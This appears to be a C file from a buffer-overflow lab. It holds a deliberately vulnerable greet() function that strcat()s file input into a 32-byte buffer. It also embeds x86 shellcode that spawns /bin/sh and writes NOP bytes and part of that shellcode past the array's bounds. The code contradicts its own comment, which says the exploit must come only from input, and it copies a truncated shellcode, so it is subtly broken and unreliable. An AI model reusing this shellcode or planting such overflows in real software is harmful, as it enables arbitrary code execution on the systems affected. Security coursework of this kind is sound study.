/* vulnerable1.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability, not by
 * modifying this code, but by providing a cleverly
 * constructed input. */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define BUFFER_SIZE 512

void greet(char *str)
{
    char shellcode[]=
    "\x31\xc0" /* xorl %eax,%eax */
    "\x50" /* pushl %eax */
    "\x68""//sh" /* pushl $0x68732f2f */
    "\x68""/bin" /* pushl $0x6e69622f */
    "\x89\xe3" /* movl %esp,%ebx */
    "\x50" /* pushl %eax */
    "\x53" /* pushl %ebx */
    "\x89\xe1" /* movl %esp,%ecx */
    "\x99" /* cdql */
    "\xb0\x0b" /* movb $0x0b,%al */
    "\xcd\x80" /* int $0x80 */
    ;
    
    char greeting[32] = "Welcome ";

    /* The following allows buffer overflow */ 
    for(int i =0;i<50;i++){
        greeting[i] = 0x90;
    }
    for(int j = 0;j<11;j++){
        greeting[j+50] = shellcode[j];
    }


    strcat(greeting, str);

    return;
}


int main()
{
    char str[BUFFER_SIZE];
	FILE *bf = fopen("badfile", "r");

    fread(str, sizeof(char), BUFFER_SIZE, bf);
    greet(str);

    printf("Returned properly: attack failed\n");
    return 1;
}
